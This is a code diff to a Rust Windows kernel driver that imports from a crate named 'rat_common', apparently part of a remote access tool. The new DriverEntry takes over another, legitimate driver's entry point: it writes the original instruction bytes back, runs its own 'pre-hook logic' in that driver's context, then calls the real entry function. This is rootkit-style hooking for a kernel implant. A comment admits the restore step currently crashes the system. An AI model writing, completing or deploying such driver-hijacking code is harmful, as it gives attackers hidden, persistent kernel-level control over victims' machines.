@@ -3,64 +3,66 @@
 extern crate alloc;
 extern crate wdk_panic;
 
+mod driver;
 mod log;
 mod string;
 
-use core::ffi::c_void;
-use core::ptr;
+use core::mem;
 
-use wdk::{self, nt_success};
+use rat_common::kernel::KernelHandoff;
 use wdk_alloc::WdkAllocator;
-use wdk_sys::_MODE::KernelMode;
-use wdk_sys::ntddk::{KeDelayExecutionThread, PsCreateSystemThread};
-use wdk_sys::{
-    DRIVER_OBJECT, LARGE_INTEGER, NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_SUCCESS,
-    THREAD_ALL_ACCESS,
-};
+use wdk_sys::{NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER};
 
 #[global_allocator]
 static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;
 
-unsafe extern "C" fn thread_routine(context: *mut c_void) {
-    let driver = context.cast::<DRIVER_OBJECT>();
-    let mut sleep = LARGE_INTEGER { QuadPart: 50000000 };
-    loop {
-        log!("Thread running from driver {driver:p}");
-        let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
-        if !nt_success(status) {
-            log!("KeDelayExecutionThread failed: 0x{status:X}");
-            break;
-        }
-    }
-}
+type DriverEntryFn =
+    unsafe extern "system" fn(driver: PDRIVER_OBJECT, registry_path: PCUNICODE_STRING) -> NTSTATUS;
 
 #[unsafe(export_name = "DriverEntry")]
 pub unsafe extern "system" fn driver_entry(
     driver: PDRIVER_OBJECT,
     registry_path: PCUNICODE_STRING,
+    extra: *const KernelHandoff,
 ) -> NTSTATUS {
-    let registry_path = match unsafe { registry_path.as_ref() } {
-        Some(s) => unsafe { string::to_utf16str(s) },
-        None => None,
-    };
-
-    log!("DriverEntry: {driver:p}, {registry_path:?}");
-    let mut thread = ptr::null_mut();
-
-    let status = unsafe {
-        PsCreateSystemThread(
-            &mut thread,
-            THREAD_ALL_ACCESS,
-            ptr::null_mut(),
-            ptr::null_mut(),
-            ptr::null_mut(),
-            Some(thread_routine),
-            driver.cast(),
-        )
-    };
-    if !nt_success(status) {
-        log!("PsCreateSystemThread failed: 0x{status:X}");
+    if extra.is_null() {
+        return STATUS_INVALID_PARAMETER;
     }
 
-    STATUS_SUCCESS
+    let extra = &unsafe { extra.read_unaligned() };
+
+    // Recover original instructions
+    // FIXME: This triggered bugcheck ATTEMPTED_WRITE_TO_READONLY_MEMORY. A proposed solution (not implemented yet) is to
+    // map the target hooked driver to our own buffer (which has RWX permissions) and call the original DriverEntry there.
+    // Not sure if that will work though, our manual PE loader hasn't been verified yet.
+    if !extra.original_driver_entry.is_null()
+        && !extra.original_instructions.is_null()
+        && extra.original_instructions_len > 0
+    {
+        unsafe {
+            extra.original_driver_entry.copy_from_nonoverlapping(
+                extra.original_instructions,
+                extra.original_instructions_len,
+            );
+        }
+    }
+
+    // Invoke our pre-hook logic
+    let _ = driver::driver_entry(
+        driver,
+        match unsafe { registry_path.as_ref() } {
+            Some(s) => unsafe { string::to_utf16str(s) },
+            None => None,
+        },
+    );
+
+    // Call the original DriverEntry
+    let status = unsafe {
+        let original_fn = mem::transmute::<*mut u8, DriverEntryFn>(extra.original_driver_entry);
+        original_fn(driver, registry_path)
+    };
+
+    // Invoke our post-hook logic
+
+    status
 }
